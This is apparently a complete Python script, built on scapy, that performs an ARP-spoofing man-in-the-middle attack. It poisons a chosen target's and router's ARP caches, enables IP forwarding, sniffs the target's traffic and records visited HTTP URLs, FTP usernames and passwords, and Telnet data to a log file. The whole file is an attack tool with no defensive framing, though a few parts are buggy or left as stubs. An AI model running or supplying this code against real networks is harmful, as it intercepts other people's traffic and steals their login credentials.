#!/usr/bin/env python
# -*- conding: utf-8 -*-
from scapy.all import *
import threading
import argparse
import sys
import os
import time

W  = '\033[0m'  # white
R  = '\033[31m' # red
G  = '\033[32m' # green
B  = '\033[34m' # blue

logger = open("sMitm_log.text", "w+")
logger.write("----------Start----------\n")
logger.write("----------%s----------\n" % time.strftime("%d/%m/%Y %H:%M:%S"))
print(R + 'press "Ctrl+C" to exit' + W + "\n")
class Parser:
    http_ports   = [80]
    mail_ports  = [25, 26, 110, 143]
    ftp_ports   = [20, 21]
    telnet_ports= [23]
    vnc_ports   = [5500, 5800, 5900]
    whats_ports = [5223, 5228, 4244, 5242, 5222]

    oldHTTPack = ""
    oldHTTPload = ""
    HTTPfragged = False
    def __init__(self, options):
        self.options = options 
    
    def parseHandler(self, pkt):
        if pkt[IP].src == self.options.target or pkt[IP].dst == self.options.target:    
            if pkt.haslayer(Raw):
                load = pkt[Raw].load
                sport, dport = (pkt[TCP].sport, pkt[TCP].dport)
                src_ip, dst_ip = (pkt[IP].src, pkt[IP].dst)
                ack = pkt[IP].ack
                
                if sport in self.http_ports or dport in self.http_ports:
                    self.parseHttp(load, src_ip, dst_ip, ack)
                    #self.parseHttpUrl(load, src_ip, dst_ip)
            
                elif sport in self.vnc_ports or dport in self.vnc_ports:
                    self.parseVnc(load, src_ip, dst_ip)

                elif sport in self.mail_ports or dport in self.mail_ports:
                    self.parseMail(load, src_ip, dst_ip)

                elif sport in self.ftp_ports or dport in self.ftp_ports:
                    self.parseFtp(load, src_ip, dst_ip)

                elif sport in self.telnet_ports or dport in self.telnet_ports:
                    self.parseTelnet(load, src_ip, dst_ip)
            
    def parseWhatsApp(self, load, src_ip, dst_ip):
        pass

    def parseHttp(self, load, src_ip, dst_ip, ack):
        if ack == self.oldHTTPack:
            self.oldHTTPload = self.oldHTTPload + load
            load = self.oldHTTPload
            self.HTTPfragged = True
        else:
            self.oldHTTPload = load
            self.oldHTTPack = ack
            self.HTTPfragged = False

        try:
            header_lines, content_lines = load.split("\r\n\r\n")
        except Exception:
            header_lines = load
            content_lines = ""
        header_lines = header_lines.split("\r\n")
        http_type, url = self.getHttpUrl(header_lines)
        if url:
            logger.write('[*] '+ url + '\n')
            d = ['.jpg', '.jpeg', '.gif', '.png', '.css', '.ico', '.js', '.svg', '.woff']
            if any(i in url for i in d):
               return
            print(R + "[*] HTTP " + http_type + ": " + G + url + B + " Source IP: " + src_ip + W + "\n")
            logger.write("[*] HTTP " + http_type + ": " + url + " Source IP: " + src_ip + "\n")
        #if content_lines:
        #    print(content_lines)

    def parseHttpPost(self, load, src_ip, dst_ip):
        pass

    def parseHttpUrl(self, load, src_ip, dst_ip):
        load = load.split('\r\n\r\n')
        header_lines, content_lines = (load[0].split("\n"), load[1:])
        http_type, url = self.getHttpUrl(header_lines)
        if url:
            print(R + "[*] HTTP " + http_type + ": " + G + url + B + " Source IP: " + src_ip + W + "\n")
            logger.write("[*] HTTP " + http_type + ": " + url + " Source IP: " +
                src_ip + "\n")

    def parseFtp(self, load, src_ip, dst_ip):
        load = load.replace("\r\n", "")
        if "USER" in load:
            print(R + "[*] FTP " + G + load + " SERVER: " + dst_ip + B +
                " Source IP: " + src_ip + W + "\n")
            logger.write("[*] FTP " + load + " SERVER: " + dst_ip + " Source IP: " + 
                src_ip + "\n")

        elif "PASS" in load:
            print(R + "[*] FTP " + G + load + " SERVER: " + dst_ip + B +
                " Source IP: " + src_ip + W + "\n")
            logger.write("[*] FTP " + load + " SERVER: " + dst_ip + " Source IP: " + 
                src_ip + "\n")

        elif "authentication failed" in load:
            print(R + "[!] FTP " + G + load + " SERVER: " + dst_ip + B +
                " Source IP: " + src_ip + W + "\n")
            logger.write("[!] FTP " + load + " SERVER: " + dst_ip + " Source IP: " + 
                src_ip + "\n")

    def parseMail(self, load, src_ip, dst_ip):
        pass

    def parseTelnet(self, load, src_ip, dst_ip):
        load = load.split(" ", 1)
        if len(load) == 2:
            load = " ".join(load)
        elif len(load) == 1:
            load = " ".join(load, "")
        print(R + "[*] Telnet " + G + load + "SERVER: " + dst_ip + B +
            " Source IP: " + src_IP + W + "\n")
        logger.write("[*] Telnet " + load + " SERVER: " + dst_ip + " Source IP: " + 
                src_IP + "\n")

    def parseVnc(self, load, src_ip, dst_ip):
        pass

    def getHttpPost(self, header_lines):
        post = ""
        for line in header_lines:
            if "POST /" in line:
                post = line.split("POST ")[1].split(" HTTP/")[0]
        return post.strip( )

    def getHttpGet(self, header_lines):
        get = ""
        for line in header_lines:
            if "GET /" in line:
                get = line.split("GET ")[1].split(" HTTP/")[0]
        return get.strip( )

    def getHttpHost(self, header_lines):
        host = ""
        for line in header_lines:
            if "Host: " in line:
                host = line.split("Host: ")[1]
        return host.strip( )

    def getHttpUrl(self, header_lines):
        url = ""
        http_type  = header_lines[0][0:header_lines[0].find("/")].strip()
        if http_type == "GET":
            url = self.getHttpHost(header_lines) + self.getHttpGet(header_lines)
        elif http_type == "POST":
            url = self.getHttpHost(header_lines) + self.getHttpPost(header_lines)
        return (http_type, url)

class sMitm:
    def arpSpoof(self, routerIP, targetIP, routerMAC, victimMAC):
        send(ARP(op=2, psrc=targetIP, pdst=routerIP, hwsrc=victimMAC, hwdst=routerMAC), verbose=0)
        send(ARP(op=2, psrc=routerIP, pdst=targetIP, hwsrc=routerMAC, hwdst=victimMAC), verbose=0)
        
    def getRouterMAC(self, ip):
        ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=5, retry=3)
        try:
            return ans[0][1].src
        except IndexError:
            return raw_input("Sorry not find MAC address, you need input the MAC address.\nRouter MAC: ")

    def getTargetMAC(self, targetIP, routerIP):
        ans, unans= srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(psrc=routerIP, pdst=targetIP), timeout=5, retry=3)
        try:
            return ans[0][1].src
        except IndexError:
            return raw_input("Sorry not find MAC address, you need input the MAC address.\nTarget MAC: ")

    def startForwardPacket(self):
        if sys.platform[:3] == "dar":
            os.system("sysctl -w net.inet.ip.forwarding=1")  # forwarding ip for MAC OS X
        elif sys.platform[:3] == "lin":
            os.system("sysctl -w net.ipv4.ip_forward=1")
    
    def stopForwardPacket(self):
        if sys.platform[:3] == "dar":
            os.system("sysctl -w net.inet.ip.forwarding=0")
        elif sys.platform[:3] == "lin":
            os.system("sysctl -w net.ipv4.ip_forward=0")

def getUserOptions( ):
    parser = argparse.ArgumentParser( )
    parser.add_argument("-ip", "--target", help="Target IP")
    parser.add_argument("-rip", "--router", help="Router IP")
    parser.add_argument("-i", "--iface", help="Choose interface to use")
    return parser.parse_args( )

def main( ):
    options = getUserOptions( )
    mitm = sMitm( )
    mitm.startForwardPacket( )

    target_ip = options.target
    router_ip = options.router
    iface  = options.iface
    parser = Parser(options)
    my_mac = get_if_hwaddr(iface)
    target_mac = mitm.getTargetMAC(target_ip, router_ip)
    router_mac = mitm.getRouterMAC(router_ip)
    kw = {"iface": iface, "prn": parser.parseHandler, "filter": "tcp"}
    sniffThread = threading.Thread(target=sniff, kwargs=kw)
    sniffThread.start( )

    print(R+"Interface: "+B+iface+W)
    print(R+"Target IP: "+B+target_ip + R+" --->> " + R+"Target MAC: " + B+target_mac+W)
    print(R+"Router IP: "+B+router_ip + R+" --->> " + R+"Router MAC: " + B+router_mac+W)
    logger.write("Interface: " + iface+"\n")
    logger.write("Target IP: " + target_ip + " --->> " + "Target MAC: " + target_mac+"\n")
    logger.write("Router IP: " + router_ip + " --->> " + "Router MAC: " + router_mac+"\n")
    while 1:
        try:
            mitm.arpSpoof(router_ip, target_ip, my_mac, my_mac)
            time.sleep(1.5)
        except KeyboardInterrupt:
            mitm.stopForwardPacket( )
            logger.write("----------End----------\n")
            logger.write("----------%s----------\n" % time.strftime("%d/%m/%Y %H:%M:%S"))
            logger.close( )
            exit()
    
if __name__ == "__main__":
    main( )
